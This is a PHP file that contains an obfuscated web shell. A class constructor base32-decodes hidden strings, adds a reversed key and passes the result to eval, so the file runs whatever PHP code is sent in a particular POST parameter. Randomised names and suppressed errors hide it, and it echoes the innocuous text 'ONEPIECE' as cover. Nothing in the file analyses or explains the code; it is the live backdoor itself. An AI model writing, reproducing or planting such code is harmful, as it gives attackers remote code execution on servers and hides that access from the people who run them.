<?php 
class PJIZ{
	    public $TEST= null;
		public $za= null;
        public $e='"---j--k---Znh-Wm"';
        public $d= null;
		public $all= null;
        function __construct(){
		$this->za = 'mv3gc3bierpvat2tkrnq';
		$this->TEST = @CLMH($this->za);
		$this->all = $this->TEST;
		$this->za = 'luutw';
		$this->TEST = @CLMH($this->za);
		
		$this->d=strrev($this->e);
		
		$this->all =$this->all.$this->d.$this->TEST;
        @eval($this->all);
        }}
new PJIZ();

function CLMH($YAXW){
    $KHVW = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($YAXW); $i < $j; $i++){
        $v <<= 5;
        if ($YAXW[$i] >= 'a' && $YAXW[$i] <= 'z'){
            $v += (ord($YAXW[$i]) - 97);
        } elseif ($YAXW[$i] >= '2' && $YAXW[$i] <= '7') {
            $v += (24 + $YAXW[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $KHVW .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $KHVW;}

	$tips = 'O'.'N'.'E'.'P'.'I'.'E'.'C'.'E';




echo $tips;

?>
